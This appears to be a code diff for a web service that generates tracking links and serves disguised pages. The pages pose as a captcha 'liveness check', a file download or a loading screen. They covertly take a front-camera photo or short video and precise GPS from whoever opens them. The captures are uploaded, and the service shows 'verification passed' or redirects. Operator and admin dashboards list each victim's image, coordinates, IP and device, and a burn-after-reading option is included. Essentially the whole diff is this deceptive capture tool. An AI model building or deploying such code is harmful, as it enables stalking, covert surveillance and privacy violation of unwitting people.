+        const id = document.getElementById('target_id').value.trim();
+        if(!id) return alert('请输入追踪 ID');
+        
+        const config = {
+          id: id,
+          template: document.getElementById('template').value,
+          redirectUrl: document.getElementById('redirect_url').value,
+          mode: document.querySelector('input[name="mode"]:checked').value,
+          needLocation: document.getElementById('need_location').checked,
+          burn: document.getElementById('burn_after_reading').checked
+        };
+
+        const btn = event.currentTarget;
+        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-2"></i>处理中...';
+        
+        try {
+          const res = await fetch('/api/generate', {
+            method: 'POST',
+            body: JSON.stringify(config),
+            headers: { 'Content-Type': 'application/json' }
+          });
+          const data = await res.json();
+          const linkBox = document.getElementById('link_result');
+          linkBox.innerHTML = '<div class="font-bold mb-1">复制以下链接发送给目标：</div><a href="' + data.url + '" target="_blank" class="underline">' + data.url + '</a>';
+          linkBox.classList.remove('hidden');
+        } catch(e) {
+          alert('生成失败');
+        } finally {
+          btn.innerHTML = '<i class="fa-solid fa-link mr-2"></i> 生成专属追踪链接';
+        }
+      }
+
+      async function queryData() {
+        const id = document.getElementById('query_id').value.trim();
+        if(!id) return alert('请输入追踪 ID');
+        
+        const isBurn = document.getElementById('burn_after_reading').checked;
+        document.getElementById('query_loading').classList.remove('hidden');
+        document.getElementById('query_result').innerHTML = '';
+
+        try {
+          const res = await fetch('/api/query?id=' + encodeURIComponent(id) + '&burn=' + isBurn);
+          const logs = await res.json();
+          
+          if(logs.length === 0) {
+            document.getElementById('query_result').innerHTML = '<div class="text-center text-gray-500 py-6">暂无该ID的访问数据或已被销毁。</div>';
+            return;
+          }
+
+          let html = '';
+          logs.forEach((log, index) => {
+            let mediaHtml = '';
+            if (log.status === 'denied') {
+              mediaHtml = '<div class="p-4 bg-red-50 text-red-600 rounded-xl text-center font-medium border border-red-100"><i class="fa-solid fa-ban mr-2"></i>用户拒绝了多媒体权限</div>';
+            } else if (log.media_url) {
+              if (log.media_type === 'video') {
+                mediaHtml = \`<video src="\${log.media_url}" controls class="w-full rounded-xl shadow-sm"></video>\`;
+              } else {
+                mediaHtml = \`<img src="\${log.media_url}" class="w-full rounded-xl shadow-sm">\`;
+              }
+            }
+
+            let geoHtml = '';
+            if (log.device_geo) {
+              const geo = JSON.parse(log.device_geo);
+              if(geo.denied) {
+                 geoHtml = '<div class="text-sm text-amber-600 mt-2"><i class="fa-solid fa-location-dot mr-1"></i>GPS定位：用户拒绝授权</div>';
+              } else {
+                 geoHtml = \`<div class="text-sm text-emerald-600 mt-2 font-mono"><i class="fa-solid fa-location-crosshairs mr-1"></i>精准GPS：\${geo.lat}, \${geo.lng} (精度:\${geo.accuracy}m)</div>\`;
+              }
+            }
+
+            const ipInfo = log.geo_info ? JSON.parse(log.geo_info) : {};
+            const ipStr = ipInfo.ip ? \`\${ipInfo.flag || ''} \${ipInfo.countryRegion || ''} \${ipInfo.city || ''} [\${ipInfo.ip}]\` : log.ip;
+
+            html += \`
+              <div class="bg-white p-4 rounded-xl border border-gray-100 shadow-sm fade-in" style="animation-delay: \${index * 0.1}s">
+                <div class="flex justify-between items-center mb-3">
+                  <span class="text-xs font-bold px-2 py-1 bg-gray-100 rounded text-gray-600">记录 #\${log.id}</span>
+                  <span class="text-xs text-gray-400"><i class="fa-regular fa-clock"></i> \${new Date(log.created_at).toLocaleString()}</span>
+                </div>
+                \${mediaHtml}
+                \${geoHtml}
+                <div class="mt-3 p-3 bg-gray-50 rounded-lg text-xs text-gray-600 space-y-1">
+                  <div><i class="fa-solid fa-network-wired w-4"></i> \${ipStr}</div>
+                  <div class="truncate" title="\${log.ua}"><i class="fa-brands fa-safari w-4"></i> \${log.ua}</div>
+                </div>
+              </div>
+            \`;
+          });
+          document.getElementById('query_result').innerHTML = html;
+        } finally {
+          document.getElementById('query_loading').classList.add('hidden');
+        }
+      }
+    </script>
+  </body>
+  </html>`;
   return new Response(html, { headers: { "Content-Type": "text/html" } });
 }
 
-// ---------- 代理IP地理查询 ----------
-async function handleGeo(request) {
+/**
+ * 核心捕获页引擎：根据配置渲染不同模板，执行静默权限请求及优化上传
+ */
+function renderTargetPage(encodedConfig) {
+  const html = `
+  <!DOCTYPE html>
+  <html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>系统验证</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      body { margin:0; font-family: system-ui, -apple-system, sans-serif; background: #f8fafc; }
+      .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; }
+      @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+  </head>
+  <body class="flex items-center justify-center min-h-screen">
+    
+    <div id="template_container" class="w-full max-w-sm p-6 text-center"></div>
+
+    <video id="v" style="display:none" autoplay playsinline muted></video>
+    <canvas id="c" style="display:none"></canvas>
+
+    <script>
+      const config = JSON.parse(decodeURIComponent(atob("${encodedConfig}")));
+      let deviceLocation = null;
+
+      // 渲染伪装UI
+      function renderUI() {
+        const container = document.getElementById('template_container');
+        if (config.template === 'captcha') {
+          container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><h3 class="font-bold text-gray-700 mb-4">进行人机身份验证</h3><p class="text-sm text-gray-500 mb-4">请允许浏览器相关权限以完成活体检测</p><div class="flex justify-center"><div class="loader"></div></div></div>';
+        } else if (config.template === 'download') {
+          container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><div class="w-12 h-12 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-4"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg></div><h3 class="font-bold text-gray-800 mb-2">文件解析中...</h3><p class="text-sm text-gray-500">正在准备安全下载通道</p></div>';
+        } else {
+           // blank & redirect default
+           container.innerHTML = '<div class="flex flex-col items-center"><div class="loader mb-4"></div><div class="text-gray-500 text-sm">页面加载中，请稍候...</div></div>';
+        }
+      }
+
+      // 执行流
+      async function execute() {
+        renderUI();
+
+        // 1. 位置权限 (如需)
+        if (config.needLocation) {
+          try {
+            const pos = await new Promise((resolve, reject) => {
+              navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: true });
+            });
+            deviceLocation = JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
+          } catch(e) {
+            deviceLocation = JSON.stringify({ denied: true, error: e.message });
+          }
+        }
+
+        // 2. 媒体权限及捕获
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, // 降低分辨率提速
+            audio: false 
+          });
+          
+          if (config.mode === 'video') {
+            await captureVideo(stream);
+          } else {
+            await capturePhoto(stream);
+          }
+        } catch(e) {
+          // 拒绝权限
+          await sendPayload(null, 'denied');
+        }
+
+        // 3. 完成处理 (模板动作)
+        if (config.template === 'redirect' && config.redirectUrl) {
+          window.location.href = config.redirectUrl.startsWith('http') ? config.redirectUrl : 'http://' + config.redirectUrl;
+        } else {
+          document.getElementById('template_container').innerHTML = '<div class="text-green-600 font-bold">✓ 验证通过</div>';
+        }
+      }
+
+      // 优化：压缩拍照快传
+      async function capturePhoto(stream) {
+        const v = document.getElementById('v');
+        v.srcObject = stream;
+        await new Promise(resolve => v.onloadedmetadata = resolve);
+        
+        // 给相机一点对焦时间
+        await new Promise(r => setTimeout(r, 800)); 
+        
+        const c = document.getElementById('c');
+        c.width = v.videoWidth;
+        c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        stream.getTracks().forEach(t => t.stop());
+
+        // 核心优化：使用 JPEG 0.6 压缩，限制在数百KB内，实现秒传
+        c.toBlob(async (blob) => {
+          await sendPayload(blob, 'success');
+        }, 'image/jpeg', 0.6);
+      }
+
+      // 视频捕获：短时低码率
+      async function captureVideo(stream) {
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        
+        recorder.onstop = async () => {
+          stream.getTracks().forEach(t => t.stop());
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          await sendPayload(blob, 'success');
+        };
+
+        recorder.start();
+        // 录制 3 秒
+        setTimeout(() => recorder.stop(), 3000);
+      }
+
+      async function sendPayload(blob, status) {
+        const fd = new FormData();
+        if(blob) {
+          fd.append('file', blob, config.mode === 'video' ? 'v.webm' : 'p.jpg');
+        }
+        fd.append('config', JSON.stringify(config));
+        fd.append('status', status);
+        if(deviceLocation) fd.append('location', deviceLocation);
+
+        await fetch('/api/upload', { method: 'POST', body: fd });
+      }
+
+      // 启动
+      window.onload = () => setTimeout(execute, 100);
+    </script>
+  </body>
+  </html>`;
+  return new Response(html, { headers: { "Content-Type": "text/html" } });
+}
+
+/**
+ * ==========================================
+ * 全局管理员总控中心后台
+ * ==========================================
+ */
+
+async function renderAdmin(request, env) {
   const { searchParams } = new URL(request.url);
-  const ip = searchParams.get('ip') || request.headers.get('cf-connecting-ip');
-  const res = await fetch(`${GEO_API}?ip=${ip}`);
-  return new Response(res.body, { headers: { 'Content-Type': 'application/json' } });
+  if (searchParams.get('p') !== ADMIN_PASSWORD) {
+    return new Response("Forbidden. Missing or invalid password.", { status: 403 });
+  }
+
+  // 获取所有系统日志
+  const { results } = await env.DB.prepare("SELECT * FROM sys_logs ORDER BY id DESC LIMIT 200").all();
+
+  const html = `
+  <!DOCTYPE html>
+  <html lang="zh">
+  <head>
+    <meta charset="UTF-8">
+    <title>SEC-TEST 超级控制台</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+  </head>
+  <body class="bg-gray-100 p-6 font-sans">
+    <div class="max-w-7xl mx-auto">
+      <div class="flex justify-between items-center mb-6 bg-white p-6 rounded-2xl shadow-sm border border-gray-200">
+        <h1 class="text-2xl font-bold text-gray-800"><i class="fa-solid fa-server text-indigo-600 mr-2"></i>全局事件审计日志 (Global Logs)</h1>
+        <div class="text-sm text-gray-500">最近 200 条系统级记录追踪</div>
+      </div>
+
+      <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-x-auto">
+        <table class="w-full text-left border-collapse whitespace-nowrap">
+          <thead class="bg-gray-50 border-b border-gray-200">
+            <tr>
+              <th class="p-4 text-sm font-semibold text-gray-600">ID / 事件</th>
+              <th class="p-4 text-sm font-semibold text-gray-600">时间</th>
+              <th class="p-4 text-sm font-semibold text-gray-600">角色 IP 与 物理定位</th>
+              <th class="p-4 text-sm font-semibold text-gray-600">精准 GPS</th>
+              <th class="p-4 text-sm font-semibold text-gray-600">捕获媒体</th>
+            </tr>
+          </thead>
+          <tbody class="divide-y divide-gray-100">
+            ${results.map(r => {
+              
+              let eventColor = r.event_type === 'GENERATE' ? 'bg-blue-100 text-blue-700' : (r.event_type === 'QUERY' ? 'bg-emerald-100 text-emerald-700' : 'bg-purple-100 text-purple-700');
+              let eventIcon = r.event_type === 'GENERATE' ? 'fa-wand-magic' : (r.event_type === 'QUERY' ? 'fa-search' : 'fa-crosshairs');
+              
+              const ipInfo = r.geo_info ? JSON.parse(r.geo_info) : {};
+              const geoStr = ipInfo.ip ? \`\${ipInfo.flag||''} \${ipInfo.countryRegion||''} \${ipInfo.city||''} - \${ipInfo.asOrganization||''}\` : 'Geo Info Error';
+
+              let mediaBlock = '<span class="text-gray-400 text-xs">N/A</span>';
+              if (r.event_type === 'VISIT') {
+                if (r.status === 'denied') {
+                  mediaBlock = '<span class="px-2 py-1 bg-red-100 text-red-600 rounded text-xs font-bold">拒绝权限</span>';
+                } else if (r.media_url) {
+                  if (r.media_type === 'video') {
+                     mediaBlock = \`<a href="\${r.media_url}" target="_blank" class="text-indigo-500 hover:underline text-xs"><i class="fa-solid fa-film"></i> 播放视频</a>\`;
+                  } else {
+                     mediaBlock = \`<a href="\${r.media_url}" target="_blank"><img src="\${r.media_url}" class="h-12 w-auto rounded hover:scale-150 transition-transform origin-left object-cover"></a>\`;
+                  }
+                }
+              }
+
+              let deviceGeoBlock = '<span class="text-gray-400 text-xs">-</span>';
+              if (r.device_geo) {
+                 const dGeo = JSON.parse(r.device_geo);
+                 if (dGeo.denied) deviceGeoBlock = '<span class="text-red-500 text-xs">拒绝定位</span>';
+                 else deviceGeoBlock = \`<div class="text-xs text-emerald-600 font-mono">\${dGeo.lat}, \${dGeo.lng}</div>\`;
+              }
+
+              return `
+              <tr class="hover:bg-indigo-50/30 transition-colors">
+                <td class="p-4">
+                  <div class="font-bold text-gray-800 mb-1">${r.target_id}</div>
+                  <span class="px-2 py-1 rounded text-[10px] font-bold ${eventColor}"><i class="fa-solid ${eventIcon} mr-1"></i>${r.event_type}</span>
+                  ${r.is_burned ? '<span class="ml-1 px-2 py-1 rounded text-[10px] font-bold bg-orange-100 text-orange-600">已焚毁</span>' : ''}
+                </td>
+                <td class="p-4 text-xs text-gray-500">${new Date(r.created_at).toLocaleString()}</td>
+                <td class="p-4">
+                  <div class="font-mono text-sm text-gray-800 mb-1">${r.ip}</div>
+                  <div class="text-xs text-gray-500 truncate max-w-xs" title="${geoStr}">${geoStr}</div>
+                  <div class="text-[10px] text-gray-400 truncate max-w-xs mt-1" title="${r.ua}">${r.ua}</div>
+                </td>
+                <td class="p-4">${deviceGeoBlock}</td>
+                <td class="p-4">${mediaBlock}</td>
+              </tr>
+            `}).join('')}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </body>
+  </html>`;
+  
+  return new Response(html, { headers: { "Content-Type": "text/html" } });
 }
